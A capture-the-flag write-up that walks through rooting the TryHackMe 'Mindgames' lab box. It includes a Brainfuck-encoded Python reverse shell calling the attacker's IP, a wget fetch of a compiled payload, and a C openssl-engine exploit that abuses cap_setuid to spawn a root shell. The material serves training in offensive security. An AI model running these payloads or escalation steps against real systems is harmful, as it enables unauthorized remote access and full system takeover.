---
layout: post
title: TryHackMe - Mindgames
date: 2023-09-22 19:20:00 +0700
tags: [boot2root, challenge, ctf, linux]
toc: true
---

<p class="message">Just a terrible idea...</p>

No hints. Hack it. Don't give up if you get stuck, enumerate harder

| Title      | Mindgames                        |
| ---------- | -------------------------------- |
| Difficulty | Medium                           |
| Author     | NinjaJc01                        |
| Tags       | boot2root, challenge, ctf, linux |

## Enumeration

### Nmap

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn mindgame.thm
[sudo] password for kali:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-22 07:03 EDT
Warning: 10.10.214.91 giving up on port because retransmission cap hit (10).
Nmap scan report for mindgame.thm (10.10.214.91)
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.61 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p 22,80 mindgame.thm
[sudo] password for kali:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-22 07:04 EDT
Nmap scan report for mindgame.thm (10.10.214.91)
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   184.03 ms 10.9.0.1
2   206.37 ms mindgame.thm (10.10.214.91)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.31 seconds
```

### HTTP (Port `80`)

![Untitled](/assets/Mindgames%20images/Untitled.png)

{% highlight html linenos %}

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Mindgames.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="/main.css" />
    <script src="/main.js"></script>
  </head>

  <body onload="onLoad()">
    <h1>Sometimes, people have bad ideas.</h1>
    <h1>Sometimes those bad ideas get turned into a CTF box.</h1>
    <h1>I'm so sorry.</h1>
    <!-- That's a lie, I enjoyed making this. -->
    <p>
      Ever thought that programming was a little too easy? Well, I have just the
      product for you. Look at the example code below, then give it a go
      yourself!
    </p>
    <p>
      Like it? Purchase a license today for the low, low price of 0.009BTC/yr!
    </p>
    <h2>Hello, World</h2>
    <pre><code>+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.</code></pre>
    <h2>Fibonacci</h2>
    <pre><code>--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.</code></pre>
    <h2>Try before you buy.</h2>
    <form id="codeForm">
      <textarea id="code" placeholder="Enter your code here..."></textarea
      ><br />
      <button>Run it!</button>
    </form>
    <p></p>
    <label for="outputBox">Program Output:</label>
    <pre id="outputBox"></pre>
  </body>
</html>
{% endhighlight %}

It seems like **Morse Code** at the **Hello, Wor!d** and the **Fibonacci** block. However, I cannot decode it:

```
┌──(kali㉿kali)-[~/morse]
└─$ echo "Hello" | bin/morse -e
.... . .-.. .-.. ---
┌──(kali㉿kali)-[~/morse]
└─$ echo ".... . .-.. .-.. ---" | bin/morse -d
HELLO
```

```
┌──(kali㉿kali)-[~/morse]
└─$ echo "+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++." | bin/morse -d
+[?>++<]>++E++?+++++E++++++E+[O>+<]>+?++[T>++<]>A[T>+++++<]>++E+++++++I+++E[T>+++++<]>+?[T>+++<]>A[O>+<]>?+++?[O>+<]>+E+++++++E>++++++++++E
```

After googling for awhile, I finally recognized it’s type of cipher which is **Brainfuck**:

![Untitled](/assets/Mindgames%20images/Untitled%201.png)

Source: [dcode](https://www.dcode.fr/cipher-identifier)

Then I use this tool to decode both of them:

![Untitled](/assets/Mindgames%20images/Untitled%202.png)

![Untitled](/assets/Mindgames%20images/Untitled%203.png)

The plaintext are blocks of Python code. Therefore, I will need a **reverse shell python** to implement the RCE attack on the target machine

## Exploit

### Gain Access - RCE

I take a reverse shell payload from this [source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md):

```
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.63.75",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<++++++++++++.>>-----.++++.<<.>>---.++++.+++++.<-----------.>------.<++.>.----.------------.++++++++.------.+++++++++++++++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<------.>>-.----.------------.++++++++.------.+++++++++++++++.<<++++++.>++++.+++++.>---------------------.<+++.+++++.---------.>-----------.<<--.>>+++++++++++++++++++++++++++++++.----.------------.++++++++.------.+++++++++++++++.<<++.>++++++++++++++.----.------------.++++++++.++++++++++++++++++++.------------.+.--.-------------.----.++++++++++++.<-----.++++++++++++++++++.>>-.<<-------------.>>----------------.++++++++++++.-..---------.--.+++++++++++++++++.<<------..------.+++++++++++++++.-.--.+++++++++++.-----------.++++++++.---.-----.+++++++++.--.-------------------.++++++++++.++++++++....-----------..++++++++++++++++++.>>-----.++++.<<-------------.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.++++.-------.++++++++++++++++++.>>.++++.<<-------------.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.+++++.--------.++++++++++++++++++.>>.++++.<<-------------.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.++++++.---------.++++++++++++++++++.>>+.++++.+++++.<<-------------.>>------.---.---------------.++++++++++++++++++++++.---------.<<------.------.+++++++++++++.>>------------.+++++++.+++++.<<.>>+++++.-----------.<<-------------.+++++++.
```

I get back to the application and try to input the example **Brainfuck** code from **Hello, Wor!d**:

![Untitled](/assets/Mindgames%20images/Untitled%204.png)

It worked! Now I paste my encoded reverse shell and execute it:

![Untitled](/assets/Mindgames%20images/Untitled%205.png)

Start a listener on my local machine and get connect to the shell:

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.214.91] 41410
$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
```

## User flag

I tried to upgrade my shell with `pty` using **python3** but it did not work:

```
$ python3 -c "import pty;pty.spawn('/bin/bash/')"
python3 -c "import pty;pty.spawn('/bin/bash/')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/lib/python3.6/pty.py", line 156, in spawn
    os.execlp(argv[0], *argv)
  File "/usr/lib/python3.6/os.py", line 542, in execlp
    execvp(file, args)
  File "/usr/lib/python3.6/os.py", line 559, in execvp
    _execvpe(file, args)
  File "/usr/lib/python3.6/os.py", line 583, in _execvpe
    exec_func(file, *argrest)
NotADirectoryError: [Errno 20] Not a directory
```

Never mind it! I then enumerate the current directory and easily get the user flag:

```
$ pwd
pwd
/home/mindgames/webserver
$ ls -l
ls -l
total 8
-rw-rw-r-- 1 mindgames mindgames   38 May 11  2020 user.txt
drwxrwxr-x 3 mindgames mindgames 4096 May 11  2020 webserver
$ cat user.txt
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}
```

### Privilege Escalation → root

I have used multiple ways to enumerate the vulnerabilities which help me to escalate the privilege. After all, I explore the **Linux Capabilities**:

```
$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```

The **openssl** binary has capabilities set as `cap_setuid+ep` is vulnerable. The exploit would be like this:

Install **libssl-dev** library in the local machine using this command:

```
sudo apt install libssl-dev
```

Create an exploit `.c` file with the content as:

{% highlight c linenos %}
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
setuid(0); setgid(0);
system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

{% endhighlight %}

```
┌──(kali㉿kali)-[~/TryHackMe/mindgame]
└─$ ls -l
total 4
-rw-r--r-- 1 kali kali 189 Sep 22 07:51 exploit.c
```

Compile the binary as following:

```
┌──(kali㉿kali)-[~/TryHackMe/mindgame]
└─$ gcc -fPIC -o exploit.o -c exploit.c
exploit.c: In function ‘bind’:
exploit.c:4:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    4 |     setuid(0); setgid(0);
      |     ^~~~~~
exploit.c:4:16: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setuid(0); setgid(0);
      |                ^~~~~~

┌──(kali㉿kali)-[~/TryHackMe/mindgame]
└─$ gcc -shared -o exploit.so -lcrypto exploit.o

┌──(kali㉿kali)-[~/TryHackMe/mindgame]
└─$ ls -l
total 24
-rw-r--r-- 1 kali kali   189 Sep 22 07:51 exploit.c
-rw-r--r-- 1 kali kali  2064 Sep 22 07:51 exploit.o
-rwxr-xr-x 1 kali kali 15712 Sep 22 07:52 exploit.so
```

   <p class="message">
   💡 Just ignore the WARNING message until the binary is successfully compiled and the output appears.

   </p>

Transfer the exploit file `.so` to the victim machine:

```
┌──(kali㉿kali)-[~/TryHackMe/mindgame]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.214.91 - - [22/Sep/2023 07:53:49] "GET /exploit.so HTTP/1.1" 200 -
```

```
$ pwd
pwd
/home/mindgames/webserver
$ ls -la
ls -la
total 7032
drwxrwxr-x 3 mindgames mindgames    4096 May 11  2020 .
drwxr-xr-x 7 mindgames mindgames    4096 Sep 22 11:45 ..
drwxrwxr-x 2 mindgames mindgames    4096 May 11  2020 resources
-rwxrwxr-x 1 mindgames mindgames 7188315 May 11  2020 server
```

```
$ wget http://10.9.63.75:8000/exploit.so
wget http://10.9.63.75:8000/exploit.so
--2023-09-22 11:57:19--  http://10.9.63.75:8000/exploit.so
Connecting to 10.9.63.75:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15712 (15K) [application/octet-stream]
Saving to: ‘exploit.so’

exploit.so          100%[===================>]  15.34K  83.6KB/s    in 0.2s

2023-09-22 11:57:19 (83.6 KB/s) - ‘exploit.so’ saved [15712/15712]

$ ls -l
ls -l
total 7040
-rw-r--r-- 1 mindgames mindgames   15712 Sep 22 11:52 exploit.so
drwxrwxr-x 2 mindgames mindgames    4096 May 11  2020 resources
-rwxrwxr-x 1 mindgames mindgames 7188315 May 11  2020 server
```

Using **openssl** to execute the exploit binary:

```
$ openssl req -engine ./exploit.so
openssl req -engine ./exploit.so
root@mindgames:~/webserver# id;whoami
id;whoami
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
root
```

Now just simply navigate to `/root` directory and get the root flag:

```
root@mindgames:~/webserver# cd /root
cd /root
root@mindgames:/root# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 38 May 11  2020 root.txt
root@mindgames:/root# cat root.txt
cat root.txt
thm{1974a617cc84c5b51411c283544ee254}
```
